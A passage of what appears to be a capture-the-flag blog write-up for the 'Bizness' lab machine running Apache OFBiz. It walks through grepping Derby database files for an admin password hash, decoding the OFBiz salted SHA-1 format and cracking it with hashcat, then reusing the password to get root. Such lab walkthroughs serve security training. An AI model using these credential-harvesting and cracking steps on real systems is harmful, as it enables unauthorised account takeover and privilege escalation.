SemanticString__Fragment--Code">ij</code></span><span class="SemanticString"> for connecting to the Derby databases from the terminal. However, I couldn’t find this tool present on the box, and also had some trouble transferring the binary from my host, as it simply refuses to run.</span></span></p></div><div id="https://www.notion.so/86fecf0182ee4ddcb47b7f60ae33bc7f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After looking around the filesystem, I found the database files are stored in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/ofbiz/runtime/data/derby/ofbiz/seg0</code></span><span class="SemanticString">. Without the help of any tools, I can just read the raw files and search for secrets. The problem is that there’s almost 65 MB of data broken into hundreds of smaller data files.</span></span></p></div><pre id="https://www.notion.so/7f1b93940e64432695b5c74d525d060a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 64936
+drwxr-xr-x 2 ofbiz ofbiz-operator  139264 Dec 21 09:15 .
+drwxr-xr-x 5 ofbiz ofbiz-operator    4096 Jan 31 04:21 ..
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10001.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10011.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator   28672 Dec 16 03:39 c1001.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10021.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10031.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:39 c10041.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:39 c10051.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10061.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10071.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10081.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c10091.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c100a1.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:38 c100b1.dat
+-rw-r--r-- 1 ofbiz ofbiz-operator    8192 Dec 16 03:39 c100c1.dat
+&lt;..SNIP..&gt;</span></span></span></code></pre><div id="https://www.notion.so/1df5f0b1791f464e9dcb5da099627334" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">strings</code></span><span class="SemanticString"> to extract all readable strings and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">grep</code></span><span class="SemanticString"> for keyword filtering, I found a password hash for an admin user:</span></span></p></div><pre id="https://www.notion.so/e2056f6be706492d808f1f2cd41f0276" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$</span></mark></span><span class="SemanticString"><span> strings * | grep -i pass
+
+&lt;..SNIP..&gt;
+Passport Login Method Type
+Passport Login Provider
+                &lt;eeval-UserLogin createdStamp=&quot;2023-12-16 03:40:23.643&quot; createdTxStamp=&quot;2023-12-16 03:40:23.445&quot; currentPassword=&quot;$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I&quot; enabled=&quot;Y&quot; hasLoggedOut=&quot;N&quot; lastUpdatedStamp=&quot;2023-12-16 03:44:54.272&quot; lastUpdatedTxStamp=&quot;2023-12-16 03:44:54.213&quot; requirePasswordChange=&quot;N&quot; userLoginId=&quot;admin&quot;/&gt;
+PASSWORD
+Password
+PASSWORD
+mail.smtp.auth.password
+SMTP Auth password setting
+mail.smtp.auth.password
+&lt;..SNIP..&gt;</span></span></span></code></pre><div id="https://www.notion.so/cb64540bb65148e4957ff0672b8750ab" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code></span></span></p></div><div id="https://www.notion.so/84fe9443ca7f430fb4e4c92484d4a16a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Hash Crack:</strong></span></span></p></div><div id="https://www.notion.so/5efb039f53d24ac891c75bec50e64064" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I threw the hash to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hashcat</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString"> for cracking, but they both failed due to the hash being in an invalid format.</span></span></p></div><pre id="https://www.notion.so/391c4065318741a98a0ad35023917664" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/bizness/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> hashcat -a 0 &#x27;$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2&#x27; /usr/share/wordlists/rockyou.txt
+
+hashcat (v6.2.6) starting in autodetect mode
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-haswell-AMD Ryzen 7 3700X 8-Core Processor, 2900/5864 MB (1024 MB allocatable), 16MCU
+
+No hash-mode matches the structure of the input hash.
+
+Started: Wed Jan 31 21:45:55 2024
+Stopped: Wed Jan 31 21:45:58 2024</span></span></span></code></pre><div id="https://www.notion.so/ebdc8e08f9474655a51997ee13b9ce64" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since the application is open-source, I can go directly to it’s </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java">source code</a></span><span class="SemanticString"> in GitHub and check exactly how the hash gets generated. This function can be found in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">HashCrypt.java</code></span><span class="SemanticString">, in particular the following two functions:</span></span></p></div><pre id="https://www.notion.so/261c9887403b4b34ba719cdd635567bb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">cryptBytes</span><span class="token punctuation">(</span><span class="token class-name">String</span> hashType<span class="token punctuation">,</span> <span class="token class-name">String</span> salt<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>hashType <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            hashType <span class="token operator">=</span> <span class="token string">"SHA"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>salt <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            salt <span class="token operator">=</span> <span class="token class-name">RandomStringUtils</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SecureRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">CRYPT_CHAR_SET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>hashType<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>salt<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token function">getCryptedBytes</span><span class="token punctuation">(</span>hashType<span class="token punctuation">,</span> salt<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getCryptedBytes</span><span class="token punctuation">(</span><span class="token class-name">String</span> hashType<span class="token punctuation">,</span> <span class="token class-name">String</span> salt<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token class-name">MessageDigest</span> messagedigest <span class="token operator">=</span> <span class="token class-name">MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>hashType<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            messagedigest<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>salt<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">UtilIO</span><span class="token punctuation">.</span><span class="token function">getUtf8</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            messagedigest<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64URLSafeString</span><span class="token punctuation">(</span>messagedigest<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token char">'+'</span><span class="token punctuation">,</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchAlgorithmException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">GeneralRuntimeException</span><span class="token punctuation">(</span><span class="token string">"Error while comparing password"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span></span></span></span></code></pre><div id="https://www.notion.so/d52b6839aee643d9afe4299af7867d03" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The entire hash consists of three parts separated by a dollar sign:</span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/eab8e05d80bd4c5ea2d6d60753e5f520" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SHA</code></span><span class="SemanticString"> indicates the hash algorithm: SHA-1;</span></span></li><li id="https://www.notion.so/277e6c7c2776449d8844ac0ec20c354e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">d</code></span><span class="SemanticString"> is the salt; and</span></span></li><li id="https://www.notion.so/393e39ce20ad4726ad0d60e7ad148d38" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code></span><span class="SemanticString"> is the URL-Safe-Base64 encoded string of the SHA-1 hash.</span></span></li></ul><div id="https://www.notion.so/9396bc87164d4ce4a1f0b32fc6ccd866" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To obtain the original SHA-1 hash, we can simply use </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://gchq.github.io/CyberChef/#recipe=From_Base64(&#x27;A-Za-z0-9-_&#x27;,true,false)To_Hex(&#x27;None&#x27;,0)&amp;input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ">CyberChef</a></span><span class="SemanticString"> to URL-Safe-Base64 decode and output it as a hex string: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">b8fd3f41a541a435857a8f3e751cc3a91c174362</code></span><span class="SemanticString"> </span></span></p></div><div id="https://www.notion.so/211450a399654acfb81322eaaaed96a8" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fce7b15ef-8f27-498e-a984-4b70ab5e06bd%2FUntitled.png?width=1546&amp;table=block&amp;id=211450a3-9965-4acf-b813-22eaaaed96a8"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fce7b15ef-8f27-498e-a984-4b70ab5e06bd%2FUntitled.png?width=1546&amp;table=block&amp;id=211450a3-9965-4acf-b813-22eaaaed96a8" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/adf288c75b8941f9adf9873bb19229f2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hashcat</code></span><span class="SemanticString"> successfully cracked the password to be </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">monkeybizness</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/afff9d8b4b6c4af18729fbb6802a282e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/bizness/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> hashcat -a 0 &#x27;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&#x27; /usr/share/wordlists/rockyou.txt -m 110
+
+&lt;..SNIP..&gt;
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 120 (sha1($salt.$pass))
+Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
+Time.Started.....: Wed Jan 31 21:52:23 2024 (1 sec)
+Time.Estimated...: Wed Jan 31 21:52:24 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  3295.2 kH/s (0.30ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1482752/14344385 (10.34%)
+Rejected.........: 0/1482752 (0.00%)
+Restore.Point....: 1474560/14344385 (10.28%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: mosnarak -&gt; moes11
+
+Started: Wed Jan 31 21:52:22 2024
+Stopped: Wed Jan 31 21:52:25 2024</span></span></span></code></pre><div id="https://www.notion.so/58572365ee6e4463887f10795f81cbc1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This is also reused as the root password!</span></span></p></div><pre id="https://www.notion.so/6c26a79d338d4844828c2696e38c7d17" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>ofbiz@bizness:~#</span></mark></span><span class="SemanticString"><span> su root
+
+Password:</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>
+
+root@bizness:~#</span></mark></span><span class="SemanticString"><span> id
+
+uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><div id="https://www.notion.so/7113dfae51c142e4b3155e6e808fef80" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e9bf41bfceeb44b995c3af739a213931" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/37e825a161544b95a7bfe94804dd2b62" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@bizness:~#</span></mark></span><span class="SemanticString"><span> cat root.txt
+
+91604e31************************</span></span></span></code></pre><div id="https://www.notion.so/b30f608d1f434db286cec6fc2789197f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/fddd6dac6d1a4f028e9635671effa621" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2024</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
